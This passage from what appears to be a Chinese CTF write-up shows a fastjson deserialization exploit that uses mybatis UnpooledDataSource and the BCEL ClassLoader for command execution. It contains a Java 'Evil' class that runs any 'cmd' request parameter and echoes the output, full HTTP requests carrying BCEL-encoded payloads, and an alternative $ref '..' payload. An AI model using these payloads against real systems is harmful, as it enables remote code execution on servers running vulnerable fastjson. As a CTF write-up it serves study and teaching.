class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">        String output = <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line"></span><br><span class="line">        m = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        PrintWriter printWriter = (PrintWriter) m.invoke(response);</span><br><span class="line">        printWriter.println(output);</span><br><span class="line">        printWriter.flush();</span><br><span class="line">        printWriter.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:[&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,]</span><br><span class="line">,&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>


<p>先将利用类加入到mapping中，再命令执行利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 43.154.17.227</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;105.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;B7EC019358A6720F1657D9F05520D5DA</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 3290</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;friend&quot;:[&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$.friend[1]&quot;&#125;, &quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dV$5bW$hU$U$fe$86$5c$ce0$9d$96$Q$a0eZ$LE$a9$N$F$82$d6kC$c5$om$z$g$$$S$E$91z$99L$O$c9$c0d$86$ce$85$e2$b5$5e$ea$fd$5e$9f$fd$F$3e$f9$92$b6$ba$ea$ea$83k$e9$f2$c1W$97$P$fa$e2$8b$fe$Ju$9f$5c$m$90$d4$5cN$ce$f9$f6$3e$7b$ef$f3$ed$7dv$e6$e7$7f$be$fd$k$c0$fd$f8RA$x$kWp$k$93bxB$c6$93$K$d2$98$921$cd0$a3$80a$96$e1$v$Fs$c8$I$cdy$ZO$LpA$c6$a2$8cg$Y$96d$9c$90$f1$ac$8ce$Z$X$Y$9eS$f0$3c$5e$Q$c3$8b$Ktd$Vt$c1$90$91$T$bf$5c$M$x2$f2$M$F$F$3d0$c5$b0$w$865$GKB$f4$94i$9b$fe$98$84Pb$60ABx$c2$c9q$Jmi$d3$e6$d3A1$cb$ddy$3dk$R$SO$3b$86n$z$e8$ae$v$d6U0$ec$XL$8fl$a4$cfn$98$d6$a8$84N$97_$M$b8$e7O8$b6$cf7$fd$f3$8e$95$e3$ae$84$f6$f4$aa$be$a1$8fX$ba$9d$l$99$b0t$cf$pU$a9$u$e1$60$j$ee$f2$V$8b$h$fe$c8$U$f7$LN$8e$UBNvU$b8$ddV$99$c9$ae$92$G$89X$d5$8d$E$d9$e5$de$bac$7b$UK$c8$u$e6v$eag$7c$d7$b4$f3$a4$l$s$R$85$d9$b1$dcL$Yu$C$7f$3d$m$5b$7b$d6$J$f1$X$5d$d3$X1wUtMgdv$h$s$f5$bd$Z_7$d6$a6$f4$f52$FD$n$r$8c$a1H$e9$a2$b4HP$cen$g$7c$dd7$v$s$G$9b$c1aXg$b8$c8$40$s$95$8c$T$b8$G$3fg$K$eaZ$FeI$e1C$c5$5d$e8g$f0T$f8$ITl$e0$92$84S$8e$9bOz$o$a0$fc$8a$ab$X$f9$r$c7$5dK$5e$e2$d9$a4Qa6Ye$m9$d7$84p$86M$V$_$e1e$caG$9e$fbU$8dq$9f$O$9c$N$7cND$b4$edJ$87$8aW$f0$aa$84$d8n$aa$e9$5c$w$5e$c3$eb$w$$$e3$N$8a$7f$db$9a$8a7$c5$8e$3de$a4$96$B$95V$b3$ba$I$b7$cc$60l7$d9$SZLJQ$8bW$a0a$d8$a0$ba$uk$E$bei$8dd$M$dd$b6E$e8o$a9x$hWT$bc$83w$Z$deS$f1$3e$3e$Q$E$7dH$5b$$$8c$ab$f8$I$l$ab$f8$E$9f$S$81$e4$ad$96$ac$8e$s$b9R$f1$Z$3eW$f1$F$faU$5cE$3fU$81$60$5cB$f7$edj$ae$ce$cc$e4$ccV$g$r$i$d9$c5$d6$b4$e3$9fs$C$3bW$a7$d2$bb$ad2$edd$C$a3P$b1X$a71$d8$e8u$d2$de$a0$x$r$c4$f3$baK$87i$eer$d2$b2x$5e$b7$c6$N$83$7b$5e$9dJ$j$bb$f3$F$97$eb$U$fe$5e$pp$5dn$fb$b5ugb$m$bd$5b$8b$w$b8$8b$7cU$eb$a5$7c$9e$b4$a3$97o$a9$b6C$bdN$q$f64$VP$S$y$9a$94$R$JG$T$8d$d7$ab$c1$o$d9j$t$ffg$b8a$e9$$$cf$d5$98$3f$ddd$efr$c3$de$81$ff$eb$XQ$93$f8$5c$a32$3c$99h$ec$Z$cb$8d$d0$40$b3$ce$o$Ln$w$c7$e9h$a4c$b4Ru$b5$a0$db$b7$c5s$81$ed$9bE$5e$bd$p$b5E$d7$O$TUX$f4$p$be$c9$a9$fc$T$89$s$N$a9$7e$c7$ac$eb$88$ac$8f$eepU$F$r$ec$pW$936$b5$$$da$c9uj$a7$Hj$eeD$Fo$Lh$7bw$a2$a9$404$7c5$f0$f8$Zn$99$c5$caM$3av$fb$q$d6$dfSq$I$9b$Khw$91muUVn$a6$96$zHhb$91$iGV$ac$40t$82$88a9$kG$l$ee$a4$7f$3a$f1$a2$ff$G$d1$R$d1$82$a3$b4$f8$jQ$u$84$fe$7d$fc$g$a4$ebh$v$n$U$P$97$QI$P$c6$a3$a1$9b$60$r$c8SC$S$cdZKP$a6$87K$d8$TW$x$f8$de$a9$a1$e1$w$9e$K$97$F$fb$g$F$R$z$y$qma$92$y$85$e2$b1LY$ac$85i$ddJ$ebvZ$x$b7$QKE$b5$e8$8f$60$f1x$w$g$bd$89$YI$3a2K$e1xgf$v$a2E3$v$f6$j$ba$96$aec$bfF$d6$P$94$d0$7d$NZ$fc$60$J$87J$b8$p$rk$R$e1$e1$f0$96o$zRu$7e$L$3d$a9V$adU$93K$e8$d5$I8$o$86$beo$e8$b0$n$dcM$e3$i$3ai$dc$870b$f4$8e$e3$Q$3a$88$92$$$dc$87$fd$YC7$3d0hX$qt$N$87$a9A$f7$e0$Kz$a9$5d$f6$e1$x$a2$f2$G$R$f8$Ti$ffJ$96$fe$c01$fc$89$E$fe$c2q$9a$B$x$VB$J$Z$a0$df$Y$7e$p$7c$90H$3f$84_0$84$e12$f1$3f$m$89$R$8ac$M_$e3$k$9a$85$c9$d3U$dcK$b3$I$f9Z$c5$J$8a$oJ$9e$d2$f44$f3$A$3d$9a$dc$m$ad$H$J$93$c9c$i$P$e1aJ$e6I$b2$de$D$e9_$K$8a1$a4$YF$ZN1$3cR$fb$8c$91$fcQ$fa$aad$f34$c6$f1$Y$sp$86$e28KX$L$ce$fd$H$b6$d8$a1$99$$$J$A$A&quot;&#125;,&#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,&quot;&quot;:&quot;&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;connection&quot;:&#123;&#125;&#125;,&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.friend.connection&quot;&#125;&#125;],&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682383704297.jpg"></p>
<p>成功实现命令执行，通过命令执行没有直接发现flag地址。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682383764861.jpg"></p>
<p>通过jar命令查看fatjar可以发现flag在里面</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682383822114.jpg"></p>
<p>如果成功登录系统，也会提示flag在fatjar里(写文章的时候才发现打错了字母 -。-)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class requestContextHolder = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Method m = requestContextHolder.getDeclaredMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        Object obj = m.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        m = obj.getClass().getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        Object request = m.invoke(obj);</span><br><span class="line"></span><br><span class="line">        m = obj.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        Object response = m.invoke(obj);</span><br><span class="line"></span><br><span class="line">        m = request.getClass().getMethod(<span class="string">&quot;getParameter&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        String cmd = (String) m.invoke(request, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd == <span class="keyword">null</span>)&#123;</span><br><span class="line">            cmd = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">        String output = <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(<span class="string">&quot;f111111ag.txt&quot;</span>);;</span><br><span class="line">        output = <span class="keyword">new</span> Scanner(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line"></span><br><span class="line">        m = response.getClass().getMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        PrintWriter printWriter = (PrintWriter) m.invoke(response);</span><br><span class="line">        printWriter.println(output);</span><br><span class="line">        printWriter.flush();</span><br><span class="line">        printWriter.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接读取flag文件并回显即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 43.154.17.227</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;105.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;B7EC019358A6720F1657D9F05520D5DA</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 3485</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;friend&quot;:[&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$.friend[1]&quot;&#125;, &quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dV$5bw$TU$U$fe$a6$b9$9c$c9t$a0i$da$C$D$c8U$m$a5m$w$8a$XR$ac$d4$CRMK$r$V$y$c5$cbdr$9aN$3b$99$vs$v$f5$8a$XT$c4$fb$fd$b6$f8$R$fa$Q$40$X$$$9et$z$fd$F$be$fb$e0$93$af$y_$d0$7dr$ni$T$ccjOr$f6$fe$ce$de$df$f9$f69$7b$e6$b7$5b$3f$fe$M$60$3f$beS$Q$c3$T$K2$Y$X$c3$84$8c$e3$K$s$f1$a4$8c$T$MY$F$MS$MO$v8$89S$C$f9$b4$8cia$3c$zcF$c6$Z$86gd$ec$97$f1$ac$8c$e7d$3c$cf$a0$x$c8$c1$QC$5e$B$c7$ac$82$k$Ud$cc$89oS$M$f32$WD$CKF$91$c1V$b0$N$8e$Y$W$c5p$96$c1$95$Q$3dh$da$a6$3f$y$n$94$ec$3d$v$n$3c$ea$e4$b9$84$8e$8ci$f3$89$a0$98$e3$ee$94$9e$b3$c8$92$c88$86n$9d$d4$5dS$cc$ab$c6$b0$3fgz$U$psd$c9$b4$86$qt$bb$fcl$c0$3d$7f$d4$b1$7d$be$ec$ls$ac$3c$a7$i$9d$99y$7dI$l$b4t$bb08j$e9$9eGP$a9$uac$83$dd$e5$b3$W7$fc$c1q$ee$cf9y$C$84$9c$dc$bcH$5b$87$i$cf$cd$T$82$5c$ac$9aF$82$ecro$d1$b1$3d$e2$S2$8a$f9$95$f8$ac$ef$9av$81$f0ar$R$cd$ae$99V$ce$a8$T$f8$8b$B$c5j7m$fa$s$3b$d7$89$5bO$Fk$3a$83cu3$c1$db$Xi$9d$7f$ca5$7d$b1$b3$3aj$b2n$s$d4$9a$ac$af$h$L$e3$fabY$u$S$9a$ca$cb$e0Qq$a9$88$S$94$p$cb$G_$f4Mb$ce$e03$E$MK$M$e7$Y$96$c9$97u$C$d7$e0GM$npL$I$9b$S9T$ec$c2n$86$XT$bc$88$97T$bc$8cW$q$it$dcB$ca$T$84$K$b3$ae$5e$e4$e7$iw$nu$8e$e7RFE$ffTU$a7$d4$89$WeaxU$c5y$bcFU$xp$bf$8a$Y$f1I$96$5c$e0s$92$abcU$d1T$bc$8e7$q$c4W$X$84$f6$a5$e2M$5cP$f1$W$de$s$fe$f5h$w$de$R$x$da$cb$96Z$9dT$9aM$ea$82nY$c1$f8$ea$92Hh3$a9$90m$de$i$N$D$G$9d$9e2$o$f0Mk0k$e8$b6$z$a8_T$f1$$$$$a9x$P$ef3$7c$a0$e2C$7c$q$E$fa$98$96$9c$ZQ$f1$J$3eU$f1$Z$3e$a7B$cc$ee$x$7f$f4B$ca_$sB_$e0KR$95$u$d4$w$d8$d5$a2$80$w$be$c2$d7$w$be$c1n$V$dfb7$j$mQ$G$J$h$eet$5c$h$c2$8c$j$bf$5d$5b$J$dbVI8$e1$f8G$9d$c0$ce7$40$b6$d6$n$TN60$e6$w$R$h$Q$7d$cdY$c7$ec$r$ba$8d$c2$3d$a5$bb$b4$99$d6$v$c7$y$8b$Xtk$c40$b8$e75$40$g$q$9f$9a$a3cM$f4$d7$Y$81$ebr$db$af$cd$bb$93$bd$99$d5$u$3a$d6$3d$94$abz$88$ca$fb$c98z$f9$82k$x$e0$N$$$b1$a6$a5$83$8a$60$d1$8f$b2E$c2$aed$f3$cdl$8aH$b1$3a$v$ffanX$ba$cb$f35$e5$P$b5X$3b$d3$b4$b6$f7$ffZM$d4$q$3d$X$e8l$kH6$b7$9b$99fSo$ab$a6$q$Lm$w$db$e9j$96c$a8r$eaj$a4$3b$eb$ee$T$81$ed$9bE$5e$bd8$b5I$cf$8a$QU$b3he$7c$99$d3$9dH$s$5b$f4$b2$c6$V$93$ae$p$aa$3e$b4$oU$d5$ua$z$a5$gk$ecv$ebk$e9$9a$fa$dd$86dK$87xV$a8$81$c7$Ps$cb$yVn$d2$9e$3b$X$b1$f1$f2$8aM$d8t$80V$l$b2$db$N$b9$ab$d2$$$ca$5dp$c4$ab1$ec$bds$f4$s$ce$ac$dc$a3$z$5b$c8$d8b$VQ$8f$ccZ$81h0$R$c3r$3c$8e$ed$b8$9b$k$b7$e2C$P$s$d1h$d1$86$3d$40$5b$H$a2h$tcl$ef$VHW$d1VB$u$R$$$n$92$e9KDC$d7$c1J$90$c7$fb$r$fa$V$xA$99$Y$u$a1$3d$a1V$eck$c6$fb$H$aa$f6t$b8$ecX$db$ec$88ha$e1$e9$I$93g$3a$94$88g$cbn$zL$f3$Y$cd$3bi$ae$dc$40$3c$j$d5$a2$bf$82$r$S$e9h$f4$3a$e2$e4$e9$caN$87$T$dd$d9$e9$88$W$cd$a6$d9O$e8$99$be$8au$gE__$c2$86$x$d0$S$hK$d8T$c2$e6$b4$5c$r$7dW$J$5b$d21$B$d4b$x$fcZD0$d8z$9b$9b$W$a9$92$bb$81miES4$b9$84$ed$9aR$c2$O1$ec$fc$9e$q$K$nI$e3i$ac$a3$b1$Dat$o$8e$$lB7$J$b7$O$f7a$3d$86$a1$d1$db$cdF$9c$c2f$y$60$L$3de$b6$e2$C$bdq$5c$c4$O$5c$c6N$5c$p$e4$_$q$f2$l$U$e9$_$f4$e2$s$f6$e2$W$fa$a4$Q$fa$r$Z$v$b2$A$8b$V$e1$c9$d3G$b38$feA$3f$G$a88$9b$f07$n$G$a9$40$bb$f0$t$ee$c1$3e$e23$8c$dfq$_$fd$KS$c6$l$88$c1$3eD$u$e7$rz$e1$ba$9f$Kx$Z$W$k$c0$83$f4$ku$8d$5e$85$k$o$9bL$d9Gq$Ai$w$faM$q0$84$83P$f00$e5$d9$C$e9_$a2$c9$Y$86$Z$ka8$c40R$fb$7b$94$fc$a3$f4$afR$f4$c38$82$a3x$M$c7$88$d1$Y$d9$da$f0$f8$7f$BH$87$F$e5$J$A$A&quot;&#125;,&#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,&quot;&quot;:&quot;&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;connection&quot;:&#123;&#125;&#125;,&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.friend.connection&quot;&#125;&#125;],&quot;username&quot;:&quot;asd&quot;,&quot;password&quot;:&quot;asd&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682384016649.jpg"></p>
<hr>
<p>结束后，看了NeSE的Writeup，才发现原来不是非得$ref调getter才能解决(我当初主要精力还是在解决怎么实现低版本$ref getter -.-)，用JSONObject一样能解决，JSONObect也没有低版本$ref各种限制，利用更简单方便。<br>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(Map object, Object fieldName)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == <span class="string">&quot;$ref&quot;</span> &amp;&amp; context != <span class="keyword">null</span> &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line"></span><br><span class="line">    typeName = lexer.stringVal();</span><br><span class="line">    lexer.nextToken(<span class="number">13</span>);</span><br><span class="line">    Object refValue = <span class="keyword">null</span>;</span><br><span class="line">    ParseContext rootContext;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;@&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span>) &#123;</span><br><span class="line">            rootContext = <span class="keyword">this</span>.context;</span><br><span class="line">            thisObj = rootContext.object;</span><br><span class="line">            <span class="keyword">if</span> (!(thisObj <span class="keyword">instanceof</span> Object[]) &amp;&amp; !(thisObj <span class="keyword">instanceof</span> Collection)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rootContext.parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    refValue = rootContext.parent.object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                refValue = thisObj;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;..&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refValue = context.object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(context, typeName));</span><br><span class="line">            <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;$&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">        <span class="keyword">for</span>(rootContext = context; rootContext.parent != <span class="keyword">null</span>; rootContext = rootContext.parent) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rootContext.object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refValue = rootContext.object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(rootContext, typeName));</span><br><span class="line">            <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(context, typeName));</span><br><span class="line">        <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当初没注意到”..”，以为在反序列化Field是所有的$ref都是新增任务后期处理，但是如果$ref是”..”的话就不会新增任务，而是直接获取parent context实现了对属性的赋值。<br>也就可以实现了前面说的，在JSONObject触发getter之前就已经完成对Field赋值了，最后就很简单的构造了，NeSE🐂🍺。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;friend&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">&quot;name&quot;: &#123;</span><br><span class="line">&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">&quot;val&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,&quot;x&quot;:&#123;</span><br><span class="line">&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,</span><br><span class="line">&quot;x&quot;: &#123;&quot;x&quot;:&#123;&#123;</span><br><span class="line">&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">&quot;c&quot;: &#123;&quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">&quot;$ref&quot;: &quot;..&quot; &#125;,&quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91$ddN$h1$Q$85$8f$93$F$c36$U$I$3f$fd$_$BZ$I$m$c8M$ef$82P$R$C$vR$g$aa$s$82k$c7$98$c4$c8$d8$d1$ae7$e2$b5$b8$81$aa$X$3c$A$PUu$i$w$b2R$bb$96$f6h$ce$7c$c7$b3$9a$7d$fc$fd$eb$B$c0$Xl$c6$98$c4r$8cWx$3d$857A$dfr$bc$e3x$cf0$b9$af$ad$f6$H$M$c5$ea$d6$ZCt$e4$$$U$c3lS$5b$d5$ca$ae$bb$w$e9$88$ae$n$a7$dctR$983$91$e8P$ff5$p$df$d7$v$dd$d1$3c$kjSg$88$8fo$a4$gx$edl$ca$f1$81$e3$p$c7$KG$85c$95zm$97$rR$9d$e8$Q$9c$O$81$bd$x1$U$rpLq$ac$95$b0$8eO$M$cbn$a0leWTh$98$cc$8c$f0$$$d9$T$83A$J$9f$b1A$f3B$8ca$$$EkF$d8$5e$ed$b4$7b$a5$a4gX$YY$da$d5$g$a7$cf$df$c0P$Z$83GF$a4i$cb$f9$T$97$d9$8b$i$b22FZ$ae$9d$c9$fe7$e5$fb$$O$ec$8c$89D$5d$g$gWk$d8$nm$p$b4$3b$o$e9$v$ff$ff$91$NcTO$98C$vU$9a$e6$90$f91$f2$p$b3$5e_$d3Bb$ba$e5$b9X$aan5$ffah$bd$91$baQ$92a$b3$9a$eb$b6$7d$a2m$af$9e$P$7cO$5c$98X$c7$w$s$e8$bf$87$87$d1$a1$3d$a3$